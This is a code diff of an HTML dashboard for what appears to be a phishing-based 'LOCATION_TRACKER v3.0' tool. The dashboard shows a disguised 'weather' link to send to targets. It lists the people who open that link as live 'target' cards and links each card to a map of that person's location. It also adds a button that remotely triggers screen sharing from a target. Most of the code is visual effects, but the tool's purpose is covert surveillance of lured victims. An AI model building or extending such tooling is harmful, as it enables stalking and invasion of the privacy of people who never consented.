-        {{/}}
-    </section>
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast">
+        <i class="fas fa-check-circle"></i>
+        <span id="toastMsg">Copied to clipboard</span>
+    </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
-    <script>
-        const content = document.querySelector("#tar-content")
-        const socket = io("", {
-            secure: true,
-            path: "/socket.io",
-            transports: ['websocket']
-        })
+    <!-- ===== APP ===== -->
+    <div class="app-wrapper">
+        <div class="app-container">
 
-        socket.on("user-connected", newId => {
-            const a = document.createElement('a')
-            a.href = `/map?id=${newId}`
-            a.className = "button is-fullwidth"
-            a.innerText = newId
-            content.appendChild(a)
-        })
+            <!-- ===== HEADER – TERMINAL ===== -->
+            <header class="terminal-header">
+                <div class="term-line">
+                    <span class="term-prompt">
+                        <i class="fas fa-chevron-right"></i> root@tracker
+                    </span>
+                    <span class="term-title">
+                        <span class="glitch-text" data-text="▶ LOCATION_TRACKER">▶ LOCATION_TRACKER</span>
+                        <span class="highlight">v3.0</span>
+                        <span class="blink">_</span>
+                    </span>
+                    <div class="header-creator">
+                        <i class="fas fa-heart"></i>
+                        <span>by</span>
+                        <a href="https://github.com/_SUDIPRO" target="_blank" rel="noopener">@_SUDIPRO</a>
+                    </div>
+                </div>
+
+                <div class="url-display">
+                    <span class="label">
+                        <i class="fas fa-link"></i> TARGET_URL
+                    </span>
+                    <code id="targetUrl">{{ global.remoteURL }}/weather</code>
+                    <button class="copy-btn" id="copyBtn" title="Copy to clipboard">
+                        <i class="fas fa-copy"></i>
+                    </button>
+                </div>
+            </header>
+
+            <!-- ===== TARGETS ===== -->
+            <section class="targets-section" id="tar-content">
+                <div class="targets-header">
+                    <div class="left">
+                        <h2>
+                            <i class="fas fa-crosshairs"></i> ACTIVE_NODES
+                        </h2>
+                        <span class="badge-count" id="targetBadge">
+                            <i class="fas fa-user-circle"></i>
+                            <span class="num" id="targetCount">0</span>
+                        </span>
+                    </div>
+                    <div class="status-pulse">
+                        <span class="dot" id="statusDot"></span>
+                        <span id="statusLabel">LIVE</span>
+                    </div>
+                </div>
+
+                <!-- Grid -->
+                <div class="target-grid" id="targetGrid">
+                    {{ for(value, key in TARGETS) }}
+                    <div class="target-card" data-id="{{ key }}">
+                        <div class="card-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="card-body">
+                            <div class="name">{{ key }}</div>
+                            <div class="sub">
+                                <span class="status-dot"></span>
+                                online
+                            </div>
+                        </div>
+                        <div class="card-actions">
+                            <button class="screen-btn" data-target="{{ key }}" title="Screen Share">
+                                <i class="fas fa-desktop"></i>
+                            </button>
+                            <a href="/map?id={{ key }}" class="arrow-link" title="View on Map">
+                                <i class="fas fa-chevron-right"></i>
+                            </a>
+                        </div>
+                    </div>
+                    {{/}}
+                </div>
+
+                <!-- empty state -->
+                <div class="empty-state" id="emptyState" style="display:none;">
+                    <div class="icon-big"><i class="fas fa-user-slash"></i></div>
+                    <p>No active nodes detected.</p>
+                    <div class="hint">Deploy the target URL to begin.</div>
+                </div>
+
+            </section>
+
+        </div>
+    </div>
+
+    <!-- ===== SOCKET.IO ===== -->
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js">
     </script>
-</body>
 
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            // 1. PARTICLE SYSTEM – animated background
+            // ============================================================
+            const canvas = document.getElementById('particleCanvas');
+            const ctx = canvas.getContext('2d');
+            let W, H;
+            let particles = [];
+            const PARTICLE_COUNT = 120;
+            const CONNECTION_DIST = 140;
+            const MOUSE_RADIUS = 160;
+
+            let mouseX = -9999;
+            let mouseY = -9999;
+            let mouseActive = false;
+
+            function resize() {
+                W = canvas.width = window.innerWidth;
+                H = canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resize);
+            resize();
+
+            class Particle {
+                constructor() {
+                    this.reset();
+                }
+                reset() {
+                    this.x = Math.random() * W;
+                    this.y = Math.random() * H;
+                    this.vx = (Math.random() - 0.5) * 0.5;
+                    this.vy = (Math.random() - 0.5) * 0.5;
+                    this.size = Math.random() * 2.5 + 1.2;
+                    this.opacity = Math.random() * 0.5 + 0.2;
+                    this.hue = Math.random() > 0.5 ? 170 : 290;
+                }
+                update() {
+                    this.x += this.vx;
+                    this.y += this.vy;
+                    if (mouseActive) {
+                        const dx = this.x - mouseX;
+                        const dy = this.y - mouseY;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < MOUSE_RADIUS && dist > 0) {
+                            const force = (MOUSE_RADIUS - dist) / MOUSE_RADIUS * 0.3;
+                            this.x += (dx / dist) * force;
+                            this.y += (dy / dist) * force;
+                        }
+                    }
+                    if (this.x < 0) this.x = W;
+                    if (this.x > W) this.x = 0;
+                    if (this.y < 0) this.y = H;
+                    if (this.y > H) this.y = 0;
+                }
+                draw() {
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                    const color = this.hue === 170 ? '0, 255, 204' : '255, 0, 255';
+                    ctx.fillStyle = `rgba(${color}, ${this.opacity})`;
+                    ctx.shadowColor = this.hue === 170 ? 'rgba(0,255,204,0.15)' : 'rgba(255,0,255,0.1)';
+                    ctx.shadowBlur = 12;
+                    ctx.fill();
+                    ctx.shadowBlur = 0;
+                }
+            }
+
+            function initParticles() {
+                particles = [];
+                for (let i = 0; i < PARTICLE_COUNT; i++) {
+                    particles.push(new Particle());
+                }
+            }
+            initParticles();
+
+            window.addEventListener('mousemove', function(e) {
+                mouseX = e.clientX;
+                mouseY = e.clientY;
+                mouseActive = true;
+            });
+            window.addEventListener('mouseleave', function() {
+                mouseActive = false;
+            });
+            window.addEventListener('touchmove', function(e) {
+                const touch = e.touches[0];
+                if (touch) {
+                    mouseX = touch.clientX;
+                    mouseY = touch.clientY;
+                    mouseActive = true;
+                }
+            }, { passive: true });
+            window.addEventListener('touchend', function() {
+                mouseActive = false;
+            });
+
+            function drawConnections() {
+                for (let i = 0; i < particles.length; i++) {
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const dx = particles[i].x - particles[j].x;
+                        const dy = particles[i].y - particles[j].y;
+                        const dist = Math.sqrt(dx * dx + dy * dy);
+                        if (dist < CONNECTION_DIST) {
+                            const alpha = (1 - dist / CONNECTION_DIST) * 0.2;
+                            ctx.beginPath();
+                            ctx.moveTo(particles[i].x, particles[i].y);
+                            ctx.lineTo(particles[j].x, particles[j].y);
+                            ctx.strokeStyle = `rgba(0, 255, 204, ${alpha})`;
+                            ctx.lineWidth = 0.6;
+                            ctx.stroke();
+                        }
+                    }
+                }
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, W, H);
+                for (const p of particles) {
+                    p.update();
+                    p.draw();
+                }
+                drawConnections();
+                requestAnimationFrame(animate);
+            }
+            animate();
+
+            // ============================================================
+            // 2. DOM LOGIC
+            // ============================================================
+            const grid = document.getElementById('targetGrid');
+            const empty = document.getElementById('emptyState');
+            const countEl = document.getElementById('targetCount');
+            const copyBtn = document.getElementById('copyBtn');
+            const urlCode = document.getElementById('targetUrl');
+            const toast = document.getElementById('toast');
+            const toastMsg = document.getElementById('toastMsg');
+            const statusDot = document.getElementById('statusDot');
+            const statusLabel = document.getElementById('statusLabel');
+
+            let toastTimer = null;
+
+            function updateUI() {
+                const cards = grid.querySelectorAll('.target-card');
+                const total = cards.length;
+                const prev = parseInt(countEl.textContent) || 0;
+                countEl.textContent = total;
+
+                if (total !== prev) {
+                    countEl.classList.remove('pop');
+                    void countEl.offsetWidth;
+                    countEl.classList.add('pop');
+                }
+
+                if (total === 0) {
+                    empty.style.display = 'block';
+                    grid.style.display = 'none';
+                } else {
+                    empty.style.display = 'none';
+                    grid.style.display = 'grid';
+                }
+            }
+
+            function showToast(msg) {
+                toastMsg.textContent = msg || 'Copied to clipboard';
+                toast.classList.add('show');
+                clearTimeout(toastTimer);
+                toastTimer = setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 2200);
+            }
+
+            // Copy URL (main)
+            copyBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const text = urlCode.textContent.trim();
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        showToast('URL copied!');
+                        copyBtn.classList.add('copied');
+                        setTimeout(() => copyBtn.classList.remove('copied'), 1600);
+                    }).catch(() => {
+                        fallbackCopy(text);
+                    });
+                } else {
+                    fallbackCopy(text);
+                }
+            });
+
+            function fallbackCopy(text) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    document.execCommand('copy');
+                    showToast('URL copied!');
+                    copyBtn.classList.add('copied');
+                    setTimeout(() => copyBtn.classList.remove('copied'), 1600);
+                } catch (_) {
+                    showToast('Could not copy. Select manually.');
+                }
+                document.body.removeChild(ta);
+            }
+
+            // ============================================================
+            // 3. SOCKET.IO
+            // ============================================================
+            const socket = io('', {
+                secure: true,
+                path: '/socket.io',
+                transports: ['websocket']
+            });
+
+            socket.on('connect', function() {
+                statusDot.className = 'dot';
+                statusLabel.textContent = 'LIVE';
+            });
+
+            socket.on('disconnect', function() {
+                statusDot.className = 'dot warning';
+                statusLabel.textContent = 'OFFLINE';
+            });
+
+            socket.on('connect_error', function() {
+                statusDot.className = 'dot warning';
+                statusLabel.textContent = 'ERROR';
+            });
+
+            socket.on('user-connected', function(newId) {
+                const existing = grid.querySelector(`.target-card[data-id="${newId}"]`);
+                if (existing) return;
+
+                const card = document.createElement('div');
+                card.className = 'target-card card-new';
+                card.dataset.id = newId;
+
+                const existingCards = grid.querySelectorAll('.target-card');
+                const delay = 0.05 + (existingCards.length * 0.05);
+                card.style.animationDelay = Math.min(delay, 0.6) + 's';
+
+                card.innerHTML = `
+                        <div class="card-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="card-body">
+                            <div class="name">${escapeHtml(newId)}</div>
+                            <div class="sub">
+                                <span class="status-dot"></span>
+                                online
+                            </div>
+                        </div>
+                        <div class="card-actions">
+                            <button class="screen-btn" data-target="${escapeHtml(newId)}" title="Screen Share">
+                                <i class="fas fa-desktop"></i>
+                            </button>
+                            <a href="/map?id=${escapeHtml(newId)}" class="arrow-link" title="View on Map">
+                                <i class="fas fa-chevron-right"></i>
+                            </a>
+                        </div>
+                    `;
+
+                grid.appendChild(card);
+                updateUI();
+                if (navigator.vibrate) navigator.vibrate(10);
+
+                setTimeout(() => {
+                    card.classList.remove('card-new');
+                }, 700);
+            });
+
+            function escapeHtml(str) {
+                const div = document.createElement('div');
+                div.textContent = str;
+                return div.innerHTML;
+            }
+
+            // ============================================================
+            // 4. SCREEN SHARE – One-Click on Target Card
+            // ============================================================
+            document.addEventListener('click', function(e) {
+                const btn = e.target.closest('.screen-btn');
+                if (btn) {
+                    e.preventDefault();
+                    const targetId = btn.dataset.target;
+                    if (!targetId) return;
+
+                    // Emit trigger to server
+                    if (typeof socket !== 'undefined' && socket && socket.connected) {
+                        socket.emit('trigger-screen-share', targetId);
+                        console.log(`📺 Triggered screen share for ${targetId}`);
+                    }
+
+                    // Open view tab
+                    const baseUrl = window.location.origin;
+                    const viewUrl = `${baseUrl}/screen-share?room=${targetId}&mode=view`;
+                    window.open(viewUrl, '_blank');
+
+                    showToast(`📺 Triggering screen share for ${targetId}...`);
+                }
+            });
+
+            // Initial update
+            updateUI();
+
+            // Expose socket for debugging
+            window.__socket = socket;
+
+            // Resize canvas on orientation change
+            window.addEventListener('orientationchange', function() {
+                setTimeout(resize, 300);
+            });
+
+            console.log('⛧ LOCATION_TRACKER v3.0 — One-click screen share on each target card');
+        })();
+    </script>
+
+</body>
 </html>
